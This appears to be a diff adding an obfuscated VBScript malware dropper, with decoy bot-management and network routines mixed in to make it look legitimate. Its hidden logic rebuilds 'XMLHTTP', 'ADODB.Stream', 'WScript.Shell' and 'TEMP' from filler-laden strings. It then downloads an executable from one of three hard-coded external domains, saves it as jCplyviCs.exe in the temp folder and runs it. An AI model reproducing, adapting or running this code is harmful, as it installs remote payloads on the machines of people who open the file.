@@ -1,0 +1,403 @@
+
+Dim TWOKKALgardenensurance 'As String
+
+Dim TWOKKALgardenInPlaceOf 'As String
+TWOKKALgardenBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+        If (found = False) Then
+            If (UBound(DB)) Then
+                ReDim Preserve DB(UBound(DB) + 1)
+            End If
+            
+            With DB(UBound(DB))
+                .Username = BotVars.BotOwner
+                .Type = "USER"
+                .Rank = 200
+                .AddedBy = "(console)"
+                .AddedOn = Now
+                .ModifiedBy = "(console)"
+                .ModifiedOn = Now
+            End With
+            SaveDB = True
+        End If
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPGIDZOAVAdodb.streaMGIDZOAVs"
+Vrungel = ".respo"+"nseBody"
+
+
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+      
+Dim TWOKKALgardenTimeTo 'As Object
+Dim TWOKKALgardenstatus
+TWOKKALgardenstatus = false
+   
+ Dim Pirates 'As String
+Dim SandySandy
+Dim TWOKKALgardencashback 'As Object
+Dim TWOKKALgardenStepByStep 'As Object
+Dim TWOKKALgardenTavyer 'As Object   
+Dim abirvalgcommodityAxxxxx 'As Object
+  
+
+Dim ZimZamZum
+
+ Function SyncObjAcommoditygarden2(param1)
+param1 = param1 + param1
+
+TWOKKALgarden5000 = TWOKKALgardenStepByStep.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+Function T2000(p, ddd) 
+    Set TWOKKALgardenRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgcommodityAxxxxx.Type = 1
+ abirvalgcommodityAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.ApplicationGIDZOAVWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "PRECHOL", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+
+Pirates = Pirates+".shellGIDZOAVProcessGIDZOAVGeTGIDZOAVT"+"emPGIDZOAVTyPRECHOL"+"pePRECHOL"
+
+
+Function SyncObjAcommoditygarden(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgcommodityAxxxxx.Savetofile TWOKKALgardenInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 69
+Samwell = Samwell + 11
+if Samwell > 33 then
+SecondP.Write VKUok
+Samwell =  Samwell / 13
+end if
+End Function
+	
+
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+
+
+Pirates = Pirates +"GIDZOAVPRECHOLoPRECHOLpenGIDZOAVwrPRECHOLiteGIDZOAVrePRECHOLspoPRECHOLnseBoPRECHOLdyGIDZOAVsaPRECHOLvetof"+"PRECHOLileGIDZOAV\jCplyviCs.ex"+"PRECHOLeGIDZOAVhttPRECHOLp:GIDZOAV//"
+Function SheduledroundObject(p,d)
+
+FC = "" + TWOKKALgardenInPlaceOf
+
+ TWOKKALgardenRunrun.Run(FC)
+
+End Function
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  Dim TWOKKALgardenPetir 'As String
+TWOKKALgardenPetir = "Ag"
+
+SandySandy = StackStack("" + "GIDZOAV" + "")
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim TWOKKALgarden4 'As String
+
+Dim TWOKKALgarden5000 'As Variant
+Dim TWOKKALgardenRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Set TWOKKALgardenStepByStep = CreateObject("" + SandySandy(00))
+ 
+Dim Valery 'As Integer
+TWOKKALgardenBelish = TWOKKALgardenBelish + "-"
+ 
+
+Function TWOKKALgardenFuks(p)
+ 
+TWOKKALgardenStepByStep.Send
+	
+
+End Function 
+Twelve = 11 + 1
+zTempVis = SandySandy(1)
+
+'Set TWOKKALgardenTimeTo = CreateObject(SandySandy(8-6))
+Set TWOKKALgardenHelmet = GetRef("SheduledroundObject")
+Set TWOKKALgarden13 = GetRef("SyncObjAcommoditygarden")
+Set TWOKKALgarden14 = GetRef("FolderToCopy")
+
+Set abirvalgcommodityAxxxxx = CreateObject("Adodb."+"streaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebugLog.txt" 
+    Print txt
+    Close 
+End Sub
+Set TWOKKALgardenTavyer = CreateObject(""+SandySandy(10-7))
+
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set TWOKKALgardencashback = TWOKKALgardenTavyer.Environment(SandySandy(1 + 3))
+
+end if	
+
+Function SetUA()
+TWOKKALgardenLamp.setRequestHeader TWOKKALgardenBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+TWOKKALgardenensurance = TWOKKALgardencashback(SandySandy(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = SandySandy(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = SandySandy(11+2) & SandySandy(11+3)
+
+TWOKKALgardenBelish = TWOKKALgardenBelish & TWOKKALgardenPetir & "ent"
+SKKmne = 19
+
+
+ZimZamZum = Array("dewekker.nl/8734gf3hf?","scottfranch.org/p66/8734gf3hf","drspay.com/8734gf3hf?")
+
+lTo = UBound(ZimZamZum)
+
+For i = 0 To lTo Step 1
+SKKmne = SKKmne * 16
+
+	on error resume  next
+
+Valery =  Valery +44
+ TWOKKALgarden4 = MarketPlace + ZimZamZum(i)
+ TWOKKALgardenStepByStep.Open SandySandy(5), TWOKKALgarden4, False
+dr1=2
+
+SKKmne = SKKmne + 91
+
+
+SetUA()
+TWOKKALgardenFuks " d "
+If TWOKKALgardenStepByStep.Status +3 = 203 Then
+TWOKKALgardenstatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if TWOKKALgardenstatus Then
+Dim Clank 'As String
+ TWOKKALgardenInPlaceOf = TWOKKALgardenensurance+ sTempVis
+
+T2000 "",4
+SyncObjAcommoditygarden2 31 
+TWOKKALgarden14 "",abirvalgcommodityAxxxxx,TWOKKALgarden5000
+Sapogi =21
+TWOKKALgardenInPlaceOfu = "" + TWOKKALgardenInPlaceOf 
+
+Sapogi = Sapogi*4
+
+Dim TWOKKALgardenJohnSnowu,TWOKKALgardenDisplay 'As Long
+TWOKKALgarden13 "ss"
+TWOKKALgardenJohnSnowu = 5066
+
+If 621  < TWOKKALgardenJohnSnowu + 1 Then
+	  
+	Hipster =SKKmne+SKKmne
+	TWOKKALgardenHelmet Hipster, SKKmne
+	TWOKKALgardenDisplay = "H"
+End If
+
+
+
+mafia = 11111
+
+end if
+10
